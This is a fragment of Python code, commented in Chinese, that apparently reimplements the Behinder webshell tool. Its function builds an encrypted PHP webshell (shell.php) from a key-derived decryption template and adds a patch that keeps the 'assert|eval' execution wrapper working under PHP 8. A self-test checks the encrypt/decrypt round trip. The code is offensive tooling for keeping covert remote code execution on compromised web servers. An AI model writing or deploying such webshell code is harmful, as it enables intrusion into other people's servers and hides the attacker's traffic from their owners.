# 6. 服务端 shell.php 生成（TransProtocolPaneController 的等价物）
# ===========================================================================

def build_shell_php(password: str = DEFAULT_PASSWORD,
                    php8_compat: bool = False,
                    decode_src: Optional[str] = None) -> str:
    """生成服务端 shell.php。

    [D] String.format(模板, transProtocol.getDecode(), "Decrypt")
        -> 第一个 %s = 整个 Decrypt 函数定义（客户端按 key 替换过占位符）
        -> 第二个 %s = 函数名，默认字面量 "Decrypt"

    :param php8_compat: 见 README 里"PHP 8 坑"。PHP >= 8.0 下，请求明文外壳
        ``assert|eval(...)`` 里的 ``assert`` 会被当成未定义常量而抛 Error（致命），
        因为 `assert` 在 PHP 8 已经不是可当常量用的东西了。
        补一个 ``define("assert", 0);`` 到第一个 %s 就能让协议跑通——
        这属于**服务端 shell 的兼容性补丁**，客户端发送格式一个字没改。
    """
    key = derive_key(password)
    dec = (decode_src if decode_src is not None else PHP_DECODE_TEMPLATE).replace(KEY_PLACEHOLDER, key)
    if php8_compat:
        dec = 'if(!defined("assert")){define("assert",0);}\n' + dec
    return SHELL_PHP_TEMPLATE % (dec, "Decrypt")


# ===========================================================================
# 7. 自检
# ===========================================================================

def _selftest() -> None:
    k = derive_key(DEFAULT_PASSWORD)
    assert k == KEY_PLACEHOLDER, k
    assert magic_num(k) == int("e4", 16) % 16

    pt = b"hello \x00\xff behinder"
    ct = encrypt(pt, k)
    assert decrypt(ct, k) == pt
    # 与 PHP openssl 结果比对（密文由 php 端算出，见 test 脚本）
    assert len(base64.b64decode(ct)) % 16 == 0
    print("selftest ok  key=%s  sample_ct=%s" % (k, ct.decode()))


if __name__ == "__main__":
    _selftest()
